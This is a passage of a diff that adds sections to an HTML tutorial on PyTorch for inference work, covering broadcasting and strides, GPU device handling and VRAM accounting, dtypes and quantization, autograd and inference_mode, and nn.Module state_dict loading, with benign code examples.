+        <p><code>H @ W2.T</code> comes out <code>[2,2]</code>, <code>b2</code> is <code>[2]</code> — <strong>different shapes, so how can they add?</strong> Broadcasting: it treats <code>b2</code> as "add the same b to every row". With different numbers it's clearer:</p>
+        <pre><code>H = [[2,5,1,2],      b = [10,20,30,40]        ← b is only one row
+     [1,1,1,1]]
+
+H + b = [[12,25,31,42],
+         [11,21,31,41]]                        ← b &quot;acts as if&quot; copied to two rows
+</code></pre>
+        <p><strong>The rule in one sentence: align from the last dimension backwards; each dimension must either match or one side must be 1 (a missing dimension counts as 1).</strong> If that holds it expands automatically; only if it fails do you get an error.</p>
+        <p><strong>The mechanism: stride = 0.</strong> Broadcasting <code>b</code> (shape <code>[4]</code>) to <code>[2,4]</code>, measured:</p>
+        <pre class="python"><code>import numpy as np
+b  = np.array([10,20,30,40])          # shape (4,)   strides (8,)
+bb = np.broadcast_to(b, (2,4))
+print(bb.shape, bb.strides)           # (2, 4)  (0, 8)   ← stride 0 on dim 0
+print(bb.base.size)                   # 4               ← still just those 4 elements underneath
+</code></pre>
+        <p><strong>stride = 0 means "to step one index along this dimension, jump 0 elements" — stay put and read the same data again.</strong> So "copied to two rows" is fake: physical memory holds one row; the second row is read by a pointer that doesn't move.</p>
+        <p>This is the same trick as transpose in another variant, so <strong>one model explains three things</strong>:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Operation</th>
+        <th>What it does to Storage</th>
+        <th>What it does to metadata</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td><code>transpose</code> / <code>.t()</code></td>
+        <td>untouched (zero-copy)</td>
+        <td><strong>swaps</strong> strides</td>
+        </tr>
+        <tr>
+        <td><code>contiguous()</code></td>
+        <td><strong>allocates a new one</strong> (real copy)</td>
+        <td>reorders to row-major</td>
+        </tr>
+        <tr>
+        <td><strong>broadcasting</strong></td>
+        <td>untouched (zero-copy)</td>
+        <td>sets the expanded dimension's stride <strong>to 0</strong></td>
+        </tr>
+        </tbody>
+        </table>
+        <p>So broadcasting is zero-copy and <strong>costs no extra VRAM</strong> — <code>[2,4] + [4]</code> never materializes a <code>[2,4]</code> copy of b.</p>
+        <p><strong>Don't confuse it with matmul's "inner-dimension alignment" (Appendix Two is about a different thing).</strong> The two rules are easy to tangle; keep them apart:</p>
+        <table>
+        <thead>
+        <tr>
+        <th></th>
+        <th>Governs</th>
+        <th>Rule</th>
+        <th>Example</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td><strong>broadcasting</strong></td>
+        <td>elementwise ops</td>
+        <td>from the <strong>last dim backwards</strong>, equal or 1</td>
+        <td><code>[2,4] + [4]</code> ✓</td>
+        </tr>
+        <tr>
+        <td><strong>matmul</strong></td>
+        <td>matrix multiply</td>
+        <td>A's <strong>last dim</strong> = B's <strong>first dim</strong></td>
+        <td><code>[2,4] @ [4,2]</code> ✓</td>
+        </tr>
+        </tbody>
+        </table>
+        <p>The whole of Appendix Two — why <code>x @ W.T</code> needs that <code>.T</code> — is about the <strong>latter</strong>, nothing to do with broadcasting. <strong>Both happen inside one <code>nn.Linear</code>: <code>x @ W.T</code> is inner-dimension alignment, <code>+ b</code> is broadcasting.</strong></p>
+        <p><strong>Why you care: it's too forgiving — it doesn't error when it's wrong.</strong> Broadcasting only checks "can the shapes be aligned"; <strong>it never checks "is this what you meant"</strong>. Three shapes that bite:</p>
+        <p><strong>① <code>[N]</code> meets <code>[N,1]</code> → silently balloons to <code>[N,N]</code>, disguised as OOM.</strong> The audio side is where this happens most, because PCM is sometimes <code>[samples]</code>, sometimes <code>[1,samples]</code> or <code>[samples,1]</code> (<code>soundfile</code> / <code>torchaudio</code> / <code>librosa</code> don't agree on the convention). Measured:</p>
+        <pre><code>[16000] / [16000, 1]  →  (16000, 16000) = 2048 MB      expected: 64 KB
+</code></pre>
+        <p>Aligning from the back by the rule: <code>16000</code> vs <code>1</code> → expand; nothing vs <code>16000</code> → expand. <strong>Perfectly legal</strong>, and you get a 2 GB matrix. <strong>This one is worth the most, because it reports OOM, not a shape error</strong> — you'll go chasing VRAM when the real problem is shape alignment (§9 ⑦).</p>
+        <p><strong>② Normalizing along the wrong axis → broadcasting succeeds, the shape is identical, the result is all wrong.</strong> The output of a text-encoding model (BGE and the like) usually needs L2 normalization first so that dot products give cosine similarity:</p>
+        <pre class="python"><code>emb / np.linalg.norm(emb, axis=1, keepdims=True)   # right: normalize each row (each sample)
+emb / np.linalg.norm(emb, axis=0)                  # wrong: normalizes along the batch
+</code></pre>
+        <p>The second line <strong>raises no error at all</strong>. Measured per-row norms after normalization — correct gives <code>[1, 1, 1, 1]</code>, wrong gives <code>[1.011, 1.153, 1.541, 1.809]</code>. Retrieval results drift, and all you'll conclude is "this embedding model is mediocre".</p>
+        <p>(A counterintuitive detail: forgetting <code>keepdims</code> and writing <code>[N,D] / [N]</code> <strong>does honestly error when D ≠ N</strong>, which saves you; only when the batch happens to equal the dimension (<code>[8,8] / [8]</code>) does it fail silently. So this trap is "usually errors, occasionally bites".)</p>
+        <p><strong>③ Mask dimensions don't line up.</strong> Attention scores are <code>[B, heads, seq, seq]</code>, the mask is <code>[B, seq]</code>; to broadcast it up you first need <code>mask[:, None, None, :]</code> to make it <code>[B,1,1,seq]</code>. You don't write this yourself, but when you read FunASR / F5-TTS modeling code, recognizing that the string of <code>[:, None, None, :]</code> and <code>unsqueeze(1)</code> is there to manufacture broadcasting dimensions makes it stop looking like gibberish.</p>
+        <p><strong>One sentence to close: broadcasting is "the small one automatically spreads over the big one", implemented via stride = 0, zero-copy; its risk isn't an error, it's shapes that happen to align and produce a result you didn't want — so when you print shapes while debugging, check "was this broadcast?" alongside them (§9).</strong></p>
+        <hr />
+        <h2 id="s5">2. Device: CPU / GPU and the thing you care about most — VRAM</h2>
+        <p>Deep learning requires massive parallelism, so the GPU is home turf.</p>
+        <pre class="python"><code>dev = &quot;cuda&quot; if torch.cuda.is_available() else &quot;cpu&quot;
+x = torch.randn(1024, 1024)
+x = x.to(dev)                    # move to GPU; equivalent to x.cuda()
+y = x @ x                        # matmul, computed on the GPU
+</code></pre>
+        <p><strong>With multiple GPUs, <code>"cuda"</code> means "the current device"</strong> (default <code>cuda:0</code>). To pick a card write <code>"cuda:1"</code>, or set <code>CUDA_VISIBLE_DEVICES=1</code> outside the process so it only sees that one card (inside the process it's then <code>cuda:0</code>). The latter is the standard deployment practice — vLLM and Xinference both assign cards this way.</p>
+        <h3 id="s5-1">Cross-device ops error out immediately</h3>
+        <pre class="python"><code>a = torch.randn(3).cuda()
+b = torch.randn(3)               # still on CPU
+a + b                            # RuntimeError: Expected all tensors on same device
+</code></pre>
+        <p>This is the most common low-level bug in inference services: some buffer / mask / <code>position_ids</code> forgot its <code>.to(device)</code>.</p>
+        <p><strong>Why does that one get missed?</strong> <code>model.to("cuda")</code> clearly moved all the weights. Because that tensor <strong>was never registered</strong> — it's just a plain Python attribute (<code>self.mask = torch.tril(...)</code>), and <code>.to()</code> has no idea it exists. For <code>.to()</code> to know about a tensor that doesn't take part in training, it must be registered with <code>register_buffer</code>. <strong>Registration has four tiers, and bypassing any of them fails silently — see the end of Appendix One.</strong></p>
+        <h3 id="s5-2">CUDA is asynchronous (must-know for your benchmarking)</h3>
+        <p>GPU ops are <strong>dispatched asynchronously</strong> — when a Python line returns, the GPU may not have finished. So wrapping <code>model(x)</code> in <code>time.time()</code> measures <em>dispatch time</em>, not <em>execution time</em>. Correct form:</p>
+        <pre class="python"><code>torch.cuda.synchronize()         # wait for the GPU to finish prior work
+t0 = time.perf_counter()
+out = model(x)
+torch.cuda.synchronize()         # wait again for this to finish
+print(time.perf_counter() - t0)
+</code></pre>
+        <p>When you benchmarked vLLM / F5-TTS from the client side you sidestepped this (end-to-end time includes the sync naturally). But the moment you want in-process kernel-level timing, <code>synchronize()</code> is mandatory.</p>
+        <p><strong>The other half of asynchrony: some operations "implicitly synchronize".</strong> <code>.item()</code>, <code>.cpu()</code>, <code>.numpy()</code>, <code>print(tensor)</code>, <code>if tensor &gt; 0:</code> — anything that brings a GPU value back into Python has to wait for the GPU to finish first. Two consequences:</p>
+        <ul>
+        <li><strong>Performance</strong>: an <code>.item()</code> on every step of a loop (say, peeking at the logits per token) breaks the GPU pipeline every time. In an inference loop, don't fetch back if you don't have to; collect and <code>.cpu()</code> once at the end.</li>
+        <li><strong>Debugging</strong>: errors inside a CUDA kernel (out of bounds, illegal memory access) are thrown <strong>asynchronously</strong>, so the traceback points at the line of the <strong>next synchronization point</strong>, not the line that actually failed. When you see <code>CUDA error: device-side assert triggered</code> or similar and the reported line is obviously innocent, rerun with the environment variable <code>CUDA_LAUNCH_BLOCKING=1</code> so every kernel runs synchronously and the error lands where it belongs (debugging only — it's much slower).</li>
+        </ul>
+        <h3 id="s5-3">VRAM: reserved vs allocated (explains the "numbers don't add up" you've seen)</h3>
+        <pre class="python"><code>torch.cuda.memory_allocated()    # bytes actually held by live tensors
+torch.cuda.memory_reserved()     # bytes PyTorch has &quot;reserved&quot; from the driver (its cache pool)
+torch.cuda.max_memory_allocated()
+torch.cuda.empty_cache()         # return reserved-but-idle memory to the driver (rarely needed)
+</code></pre>
+        <p>Key mechanism: <strong>PyTorch has its own caching allocator.</strong> It grabs large blocks of VRAM from CUDA and slices/reuses them itself, avoiding frequent <code>cudaMalloc</code>. So <code>reserved</code> is usually <strong>larger</strong> than <code>allocated</code>. That's why "my model is only a few GB but nvidia-smi shows a big chunk used" — it's not a leak, it's the cache.</p>
+        <p>But to make the numbers <strong>actually add up</strong>, two more items are missing. A process's footprint in <code>nvidia-smi</code> is, in full:</p>
+        <pre><code>what nvidia-smi shows ≈ reserved (PyTorch&#39;s cache pool, which includes allocated)
+                      + CUDA context (a fixed few hundred MB per process, in no torch counter at all)
+                      + non-PyTorch allocations (cuBLAS workspace, NCCL buffers, other libraries&#39; own cudaMalloc)
+</code></pre>
+        <p>So even if <code>empty_cache()</code> drives reserved to zero, nvidia-smi won't go to zero — those few hundred MB of context stay as long as the process lives. With multiple cards or multiple processes (e.g. vLLM's tensor parallel, one process per card), every process carries its own context, and that has to be counted separately under "overhead" in §3.</p>
+        <p>This is exactly why vLLM <em>bypasses</em> the allocator: at startup vLLM grabs a large slab of VRAM via <code>gpu_memory_utilization</code> and <strong>manages it itself</strong> (PagedAttention's paged KV cache), instead of letting PyTorch's general-purpose allocator handle the KV cache. Your earlier findings — "ECC-off gives ~6.3% more VRAM," "~4.4 MiB per concurrent slot" — are precisely you quantifying the behavior of this self-managed memory.</p>
+        <hr />
+        <h2 id="s6">3. dtype and precision: fp32 / fp16 / bf16 / int8</h2>
+        <p>This is the dial that directly governs your <strong>VRAM footprint and throughput</strong> — the section you'll resonate with most.</p>
+        <table>
+        <thead>
+        <tr>
+        <th>dtype</th>
+        <th>bytes</th>
+        <th>range</th>
+        <th>precision</th>
+        <th>common inference use</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td><code>float32</code></td>
+        <td>4</td>
+        <td>large</td>
+        <td>high</td>
+        <td>training default, CPU</td>
+        </tr>
+        <tr>
+        <td><code>float16</code></td>
+        <td>2</td>
+        <td><strong>narrow</strong> (overflows easily)</td>
+        <td>medium</td>
+        <td>inference on older GPUs</td>
+        </tr>
+        <tr>
+        <td><code>bfloat16</code></td>
+        <td>2</td>
+        <td>large (same exponent bits as fp32)</td>
+        <td>lower mantissa</td>
+        <td><strong>default for modern LLM inference</strong></td>
+        </tr>
+        <tr>
+        <td><code>float8</code> (e4m3 / e5m2)</td>
+        <td>1</td>
+        <td>small</td>
+        <td>low</td>
+        <td><strong>native from the L20 (Ada) onwards</strong>; vLLM's <code>--quantization fp8</code> and <code>--kv-cache-dtype fp8</code> are this</td>
+        </tr>
+        <tr>
+        <td><code>int8</code></td>
+        <td>1</td>
+        <td>—</td>
+        <td>quantized</td>
+        <td>weight / KV-cache quantization</td>
+        </tr>
+        <tr>
+        <td><code>int4</code> (AWQ / GPTQ)</td>
+        <td>0.5</td>
+        <td>—</td>
+        <td>quantized</td>
+        <td>weight quantization; in practice 8 four-bit weights are packed into one int32 and unpacked on the fly by the quantization kernel (the name <code>torch.int4</code> does exist, but don't be fooled — see the note under the table)</td>
+        </tr>
+        </tbody>
+        </table>
+        <p>(fp8 and int8 are both 1 byte but not the same tier: fp8 is <strong>floating point</strong>, with exponent bits, so its dynamic range is far larger than int8's and it's far more tolerant of the value distribution — vLLM's fp8 can quantize online at load time with no calibration data, usually with very little precision loss; int8 / int4 generally need scale factors computed on a calibration set first (what AWQ / GPTQ releases ship is the precomputed version). That's why fp8 has become the first choice on newer cards.)</p>
+        <blockquote>
+        <p><strong>About <code>torch.int4</code> (an easily misread detail)</strong>: late torch 2.x did add <code>torch.int4</code> / <code>torch.uint4</code>, plus a family of <code>uint1</code> / <code>uint2</code> / <code>float4_e2m1fn_x2</code>, so you'll see them in <code>dir(torch)</code> — don't assume the table above is wrong. But right now they're only <strong>type markers</strong>, not dtypes you can compute with:</p>
+        <pre class="python"><code>&gt;&gt;&gt; torch.zeros(8, dtype=torch.int4).element_size()
+1                                   # storage isn&#39;t compressed to half a byte at all
+&gt;&gt;&gt; torch.zeros(4, dtype=torch.int4) + torch.zeros(4, dtype=torch.int4)
+NotImplementedError: &quot;add_stub&quot; not implemented for &#39;Int4&#39;
+</code></pre>
+        <p>Not even addition is implemented. <strong>So seeing the name doesn't mean PyTorch natively supports int4 compute</strong>; the real work is still done by AWQ / GPTQ's packed format plus dedicated kernels.</p>
+        </blockquote>
+        <p>Key points:</p>
+        <ul>
+        <li><strong>bf16 vs fp16</strong>: both are 2 bytes, but bf16 trades mantissa (fractional precision) for the same exponent range as fp32, so it's <strong>far less prone to NaN/inf</strong>. Qwen3-class weights are typically bf16; when you start vLLM with <code>--dtype bfloat16</code> (or <code>auto</code>) you're selecting this. The L20 is Ada-architecture and supports bf16 natively.</li>
+        <li><strong>Halves your VRAM</strong>: fp16/bf16 weights are half the size of fp32. 7B params × 2 bytes ≈ 14 GB — that's your back-of-envelope formula for "will this model fit on the card": <code>param_count × bytes_per_param</code>.</li>
+        <li><strong>int8/int4 quantization</strong>: compresses weights further to 1 byte or less (GPTQ/AWQ/FP8). On the L20 (48G) this is your main lever to fit bigger models or push higher concurrency.</li>
+        </ul>
+        <pre class="python"><code>model = model.to(torch.bfloat16)         # convert the whole model to bf16
+x = x.to(torch.bfloat16)                 # input must match, or you get a dtype-mismatch error
+</code></pre>
+        <p>Mixed precision (training-only, just be aware): <code>torch.autocast</code> runs some ops in half precision and keeps others in fp32 automatically, balancing speed and numerical stability.</p>
+        <h3 id="s6-1">VRAM back-of-envelope: the full budget</h3>
+        <p><strong>"Back-of-envelope" is an idiom</strong> for a rough estimate you could scribble on the back of an envelope — order-of-magnitude, not precise, meant for "does it fit?" decisions.</p>
+        <p>The <code>params × bytes</code> above is just the <strong>weights</strong>. The full inference VRAM budget is:</p>
+        <pre><code>VRAM ≈ weights + KV cache + activations + overhead
+</code></pre>
+        <ol>
+        <li><strong>Weights</strong> = <code>params × bytes</code>. bf16=2, int8=1, int4≈0.5 bytes. 7B bf16 ≈ 14GB; 7B int4 (AWQ) ≈ 3.5GB. <strong>Fixed.</strong></li>
+        <li><strong>KV cache (the big LLM variable)</strong> ≈ <code>2 (K and V) × n_layers × n_kv_heads × head_dim × seq_len × batch × bytes</code>. Grows linearly with <strong>context length × concurrency</strong> — exactly what inference engines spend their effort managing (Part 2). At long context + high concurrency it can rival or exceed the weights. (Qwen uses GQA, so n_kv_heads &lt; n_heads, making it smaller than full multi-head.)</li>
+        <li><strong>Activations</strong> — transient intermediates during the forward pass. During <strong>decode</strong> (§4: autograd off, no graph stored) they're tiny, basically negligible — that's the root of why inference is lighter than training. But there's one exception worth noting: <strong>during long prefill / large batch, activations can spike</strong>, especially the attention-score block which is theoretically <code>[batch, heads, seq, seq]</code> (grows quadratically with sequence length). FlashAttention avoids materializing this O(seq²) attention-score matrix in VRAM via online softmax, keeping it from blowing up — so "activations are negligible" strictly has a precondition, and this is one of the key reasons FlashAttention matters.</li>
+        <li><strong>Overhead</strong> — CUDA context, framework buffers, fragmentation, and §2's "reserved-but-unused" caching pool. Reserve ~1–2GB or a fraction.</li>
+        </ol>
+        <p>The back-of-envelope for "will it fit on an L20 (48G)": <strong>weights (fixed) + a slab for KV cache (depends on max_model_len × concurrency) + overhead</strong>, then vLLM's <code>gpu_memory_utilization</code> carves the rest for KV cache. The point is the order-of-magnitude judgment, not the exact number.</p>
+        <blockquote>
+        <p><strong>Quantization is orthogonal to all of this.</strong> AWQ/GPTQ quantize <strong>weight precision</strong> (packing Linear weights to 4-bit to shrink size / save VRAM); they <strong>don't touch the tokenizer / vocab / model structure</strong>. So switching to a quantized build leaves the tokenizer outputs, <code>vocab_size</code>, and the whole tokenization story unchanged — beginners often assume "the quantized build changes everything," but it only moves the "bytes-per-weight" knob.</p>
+        </blockquote>
+        <hr />
+        <h2 id="s7">4. Autograd: understand it mainly so you can <em>turn it off</em></h2>
+        <p>PyTorch's signature feature is automatic differentiation: during the forward pass it <strong>quietly records a computation graph</strong>, then differentiates along it on <code>backward</code>.</p>
+        <pre class="python"><code>x = torch.tensor([2.0], requires_grad=True)
+y = x ** 2 + 3 * x
+y.backward()                     # autodiff
+print(x.grad)                    # dy/dx = 2x+3 = 7
+</code></pre>
+        <p><strong>But you do inference — you don't need gradients at all.</strong> Recording the graph means storing intermediate activations, which costs both VRAM and time. So at inference you must turn it off:</p>
+        <pre class="python"><code># Form 1: context manager
+with torch.no_grad():
+    out = model(x)
+
+# Form 2: more thorough, the inference go-to (skips version counters and other overhead too)
+with torch.inference_mode():
+    out = model(x)
+</code></pre>
+        <p>Difference between <code>no_grad</code> / <code>inference_mode</code>: the latter is more aggressive — it forbids these tensors from ever entering a graph again, with lower overhead. It's the recommended form for pure inference. <strong>vLLM / FunASR / F5-TTS all run their forward passes in this mode</strong> — you never feel it through the API, but understanding it explains <em>why inference uses so much less VRAM than training</em>: what's saved is exactly this graph and its intermediate activations.</p>
+        <p><strong>The one practical difference between the two that will bite: tensors produced inside <code>inference_mode</code> can never enter a computation graph later.</strong> The error reads <code>RuntimeError: Inference tensors cannot be saved for backward</code>. When you'll hit it — exactly the "freeze the encoder, train only a head" scenario §5 describes: you batch-compute embeddings under <code>inference_mode()</code>, then use them to train a head, and <code>backward</code> blows up. Two ways out: use <code>no_grad()</code> for the embedding step (it produces ordinary tensors, just without a recorded graph); or <code>.clone()</code> the results before using them. The rule: <strong>pure inference → <code>inference_mode</code>; if the outputs will later feed training → <code>no_grad</code>.</strong></p>
+        <p>There's a companion switch — different purpose, but usually seen together:</p>
+        <pre class="python"><code>model.eval()                     # switch to inference behavior: turn off Dropout, use BatchNorm&#39;s running stats
+</code></pre>
+        <p><code>model.eval()</code> changes <strong>layer behavior</strong> (Dropout/BatchNorm behave differently in train vs eval); <code>no_grad()</code> changes <strong>whether a graph is built</strong>. They're orthogonal — at inference you generally want both: <code>model.eval()</code> + <code>inference_mode()</code>. (A model returned by transformers' <code>from_pretrained</code> <strong>is already in eval mode</strong>, no need to call it again; something you <code>torch.load</code> yourself, or a hand-written <code>nn.Module</code>, defaults to train mode and you must switch it.)</p>
+        <blockquote>
+        <p>That "BatchNorm <strong>running statistics</strong>" above is not a temporary training variable — it's a <strong>buffer</strong>: not learnable, but <strong>saved into state_dict alongside the weights, shipped with them, and required to match on load</strong>. §7 adds this tier to "what's actually inside state_dict"; the mechanism is at the end of Appendix One.</p>
+        </blockquote>
+        <h3 id="s7-1">autograd ≠ backpropagation (strictly speaking)</h3>
+        <ul>
+        <li><strong>autograd</strong> is the <strong>engine</strong>: during the forward pass it records the computation graph and stores intermediate activations, making "being differentiable" possible.</li>
+        <li><strong>backpropagation</strong> is the <strong>algorithm</strong>: walking that graph backward and applying the chain rule — i.e. what <code>loss.backward()</code> triggers.</li>
+        </ul>
+        <p>Treating "autograd" as shorthand for backprop is fine in conversation, but the layering is: autograd = graph recording (forward) + reverse differentiation (backward); backprop is specifically the backward half. At inference you need neither half, which is why <code>inference_mode()</code> skips even the graph recording — that's where the VRAM savings come from.</p>
+        <p><strong>The real determinant is inference vs training, not "someone else's pretrained model vs your own":</strong></p>
+        <pre><code>training:   forward → loss → backward(backprop) → optimizer.step()   ← all three are training-only
+inference:  forward only (weights frozen, no gradients)
+</code></pre>
+        <p>Doing prompt engineering (not touching weights) = pure inference → autograd off. If you later do <strong>LoRA</strong> on Qwen (updating weights) = training → autograd is back (you need gradients, backward, an optimizer). So don't bind "pretrained model" to "no autograd"; the switch is <strong>"am I updating weights in this step or not."</strong></p>
+        <hr />
+        <h2 id="s8">5. nn.Module: a model is just "a function that carries weights"</h2>
+        <p>A model is essentially: a bunch of weight tensors + a <code>forward</code> function. <code>nn.Module</code> is the standard container that holds it. We'll use a minimal <strong>two-layer network</strong> (two <code>nn.Linear</code>s, one hidden layer) called <code>TinyNet</code> to explain everything — <strong>note that "layer" here counts weight layers, not node layers; older textbooks call the same thing a "three-layer network" (input + hidden + output); this naming trap is untangled in "How many hidden layers?" below</strong> — once you get this, the real models like Qwen3 and bge share exactly the same scaffold, just with "two layers" swapped for "dozens."</p>
+        <pre class="python"><code>import torch
+import torch.nn as nn
+
+# Map N input features to 2 class scores (binary classifier): n_features is a constructor arg, output dim 2 is hardcoded
+class TinyNet(nn.Module):
+    def __init__(self, n_features):          # ← how many input features, passed from outside
+        super().__init__()
+        self.fc1 = nn.Linear(n_features, 4)  # weight W(4×n_features) + bias b(4), auto-registered as parameters
+        self.fc2 = nn.Linear(4, 2)           # output is always 2 — the &quot;2&quot; in &quot;binary classifier&quot;
+
+    def forward(self, x):                     # defines the forward pass; triggered by model(x)
+        x = torch.relu(self.fc1(x))
+        return self.fc2(x)
+
+model = TinyNet(3)                            # credit-card fraud: 3 features (amount / geo-distance / frequency) → normal vs fraud
+out = model(torch.randn(1, 3))                # input [batch=1, 3 features] — dim 0 is always batch (see Appendix Two)
+# model = TinyNet(1024)                       # the input dim is just a knob: set it to 1024 and it plugs in after a text encoder (later in this section)
+</code></pre>
+        <p>Its weights are random and untrained, so the output is meaningless — but the <strong>shape</strong> (<code>3 → 4 → 2</code>) is that of a working classifier. Let's take it apart layer by layer.</p>
+        <blockquote>
+        <p><strong>What's that <code>4</code> in the middle?</strong> The hidden-layer width — a pure <strong>capacity knob</strong>; 4, 8, 16, 64 all work, and it's independent of "how many inputs" or "how many output classes." For "how many hidden layers, how wide each," see "How many hidden layers?" below.</p>
+        </blockquote>
+        <h3 id="s8-1">state_dict: this is what model files contain</h3>
+        <p>Why look at this first — because it directly explains <strong>what a model file is</strong>:</p>
+        <pre class="python"><code>sd = model.state_dict()
+# OrderedDict: {&#39;fc1.weight&#39;: tensor(4×3), &#39;fc1.bias&#39;: tensor(4),
+#               &#39;fc2.weight&#39;: tensor(2×4), &#39;fc2.bias&#39;: tensor(2)}
+</code></pre>
+        <p><code>state_dict</code> is a <strong>param-name → weight-tensor</strong> dict. Its <strong>keys are not arbitrary names — they're "the attribute path from root module to this tensor"</strong>, joined by <code>.</code>. In TinyNet, <code>self.fc1</code> is an <code>nn.Linear</code> which internally has <code>self.weight</code>, so the path is <code>fc1.weight</code>; <code>fc2.bias</code> likewise.</p>
+        <p>Real models just have longer paths. The key is each layer's name; the value is that layer's trained parameter tensor. Dump a Qwen3 and you see:</p>
+        <pre><code>model.layers.0.self_attn.q_proj.weight
+model.layers.0.mlp.gate_proj.weight
+model.layers.1.self_attn.q_proj.weight
+...
+model.layers.31.mlp.down_proj.weight
+</code></pre>
+        <p>Same idea: <code>model</code> (backbone) → <code>layers</code> (a container holding 32 blocks) → <strong><code>0</code></strong> (which block) → <code>self_attn</code> → <code>q_proj</code> (a Linear) → <code>weight</code>. The entire key set is the same handful of names <strong>repeated 32 times</strong>, with only the index changing. <strong>That index is the layer number — where it comes from, and why TinyNet doesn't have one, is explained in Appendix One (Containers).</strong></p>
+        <p>Every loader does the same thing: <strong>first build the model skeleton from the config (all random values), then pour the trained parameters from the <code>state_dict</code> into it.</strong> FunASR's <code>AutoModel.build_model()</code> does this (pouring from <code>model.pt</code>); transformers' <code>AutoModel.from_pretrained()</code> does this too (pouring from safetensors, §8) — both libraries have something called <code>AutoModel</code>, they are two unrelated classes, don't mix them up.</p>
+        <p>The <code>.safetensors</code> / <code>pytorch_model.bin</code> you download contains exactly this (safetensors is the safer, zero-copy mmap format; bin is the old pickle format with security risks — see §7). Loading just pours it back into the structure:</p>
+        <pre class="python"><code>sd = torch.load(&quot;weights.bin&quot;, map_location=&quot;cpu&quot;, weights_only=True)   # read it as a dict first
+model.load_state_dict(sd)                                               # then pour it into the structure
+</code></pre>
+        <p>(<code>map_location="cpu"</code>: a <code>.pt</code> records which card each tensor was on when saved; on a machine with no GPU, or different card numbering, a bare <code>torch.load</code> fails with something like <code>CUDA device 1 not available</code> — landing on CPU first and then <code>.to()</code> is the safe path. <code>weights_only=True</code>: only deserialize tensors, execute no code — §7 explains why.)</p>
+        <p>So a model = <strong>structure definition (the <code>nn.Module</code> in code)</strong> + <strong>weights (the <code>state_dict</code> file)</strong>, kept separate. One of the things vLLM / FunASR do for you is assemble the HuggingFace structure definition and weight files together. This also explains why "weights are right but the code version is wrong" fails to load — the structure and the <code>state_dict</code> keys don't match.</p>
+        <p><strong>But "mismatch means error" has one important exception, and it's precisely the path you use most.</strong> <code>load_state_dict</code> defaults to <code>strict=True</code>, erroring on missing or unexpected keys; <strong>transformers' <code>from_pretrained</code> does not error by default</strong> — weights missing from the file are filled with random initialization, keys present in the file but not in the model are discarded, and all you get is one warning line in the log:</p>
+        <pre><code>Some weights of Qwen3ForCausalLM were not initialized from the model checkpoint at ... and are newly initialized: [&#39;lm_head.weight&#39;]
+You should probably TRAIN this model on a down-stream task ...
+</code></pre>
+        <p>This is a major source of "no error anywhere, output is garbage": the model loads, runs, and produces nonsense because a few layers are random numbers. When loading an unfamiliar model, <strong>checking the log for <code>newly initialized</code> / <code>unexpected keys</code></strong> has to become a habit (§9 ⑧).</p>
+        <h3 id="s8-2">A real case: stripping a prefix — the strongest evidence that "keys are attribute paths"</h3>
+        <p>We said keys are "the attribute path from the root module to the tensor." That sentence has a direct corollary that plays out every day: <strong>change the root, and the whole key set must be rewritten — and only strings change; not a single float is touched.</strong></p>
+        <p>Fun-ASR-Nano's official weights, <code>model.pt</code>, are in <strong>training format</strong>: one <code>state_dict</code> holding all four parts — encoder, adaptor, CTC, LLM — with keys like:</p>
+        <pre><code>audio_encoder.…          ← SenseVoice encoder
+audio_adaptor.…          ← projection layer
+ctc.…                    ← timestamp side path
+llm.model.layers.0.…     ← decoder (Qwen3-0.6B)
+</code></pre>
+        <p>vLLM wants only the LLM, and wants it to appear as the <strong>root module</strong> — i.e. <code>model.layers.0.…</code> with no <code>llm.</code> in front. FunASR's conversion function does exactly this:</p>
+        <pre class="python"><code>for key, value in state_dict.items():
+    if key.startswith(&quot;llm.&quot;):
+        llm_state[key[len(&quot;llm.&quot;):]] = value    # strip the prefix; the tensor moves over untouched
+</code></pre>
+        <p><strong>Stripping a prefix = promoting a submodule to root module.</strong> This works, and needs nothing more than string slicing, for one reason only: keys are attribute paths — the first segment is "where to start counting from"; change the starting point and you just cut off the first segment.</p>
+        <p>It's also the real-life version of §7's "model = structure + weights + tokenizer": with this weight file alone vLLM still can't load it; the conversion function also has to copy a <code>config.json</code> + tokenizer from the official repo to make up a complete directory. <strong>The training format (one big pickle, self-contained) and the inference format (a directory, three things kept separate) are not the same thing</strong>, and the adaptation step in between can't be skipped (§7 expands on this).</p>
+        <h3 id="s8-3">Dissecting <code>nn.Linear</code>: affine transform, <code>[out, in]</code>, and the fully-connected diagram</h3>
+        <p>Both layers in TinyNet are <code>nn.Linear</code>. <strong><code>nn.Linear(in, out)</code> computes an affine transformation (linear transform + translation)</strong> — the code does:</p>
+        <pre><code>y = x @ W.T + b        (x is a row / batched — the form you&#39;re used to)
+</code></pre>
+        <p>It maps <code>in</code>-dim input to <code>out</code>-dim output. The most intuitive view — <strong>the output side has <code>out</code> "neurons," each looking at all <code>in</code> inputs</strong>:</p>
+        <pre><code>out[i] = wᵢ · x + b[i]     ← neuron i: in weights dotted with in inputs, plus 1 bias
+</code></pre>
+        <p>Here <code>wᵢ</code> (neuron i's weight row) and <code>x</code> are both plain vectors of length <code>in</code>, and <code>·</code> is a <strong>dot product</strong> (elementwise multiply then sum).</p>
+        <p><strong>Why is W always <code>[out, in]</code>? Draw TinyNet as a fully-connected graph and it's obvious — each number in W is one edge in the graph:</strong></p>
+        <figure><img src="./images/mlp-tinynet-342-en.svg" alt="TinyNet 3→4→2: the weights of the two layers are the two sets of edges" /></figure>
+        <ul>
+        <li><strong>"Fully connected" (where <code>fc</code> comes from) = every output node connects to every input node.</strong> In the diagram, each of h's 4 nodes draws an edge from all 3 inputs; each of y's 2 nodes draws an edge from all 4 h nodes.</li>
+        <li><strong>Count edges = count shape</strong>: <code>fc1</code> has <code>3 × 4 = 12</code> edges → W₁ is <code>[4, 3]</code>; <code>fc2</code> has <code>4 × 2 = 8</code> edges → W₂ is <code>[2, 4]</code>. <strong>Don't memorize shapes — count edges.</strong></li>
+        <li><strong>One row = one neuron's incoming edges</strong>: stare at output <code>yᵢ</code> — it has 4 incoming edges (one from each of h₀…h₃), and those 4 edges are row i of W₂: <code>W[i, :]</code>. <code>out</code> neurons → <code>out</code> rows; each row has <code>in</code> incoming edges → <code>in</code> columns. That's the graphical version of <strong><code>[out, in]</code> = "each row is one neuron, containing all its incoming edges"</strong> — the two matrices on the right side of the figure are read directly from the graph.</li>
